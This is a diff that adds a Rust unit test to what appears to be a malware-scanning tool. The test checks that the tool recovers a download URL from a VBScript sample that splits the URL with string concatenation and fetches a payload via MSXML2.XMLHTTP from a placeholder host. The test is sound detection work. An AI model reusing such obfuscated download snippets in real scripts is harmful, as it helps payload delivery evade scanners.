@@ -9463,6 +9463,28 @@ http.Send"#;
     }
 
     #[test]
+    fn vbs_xmlhttp_url_extracted_from_plus_concat_variable() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim u, http
+u = "ht" + "tp://vbs-plus-concat.example/payload.txt"
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", u, False
+http.Send"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-plus-concat.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS plus-concatenated variable URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn vbs_xmlhttp_url_extracted_from_inline_concat_argument() {
         let mut env = Environment::new(&Config::default());
         let vbs = br#"Dim http
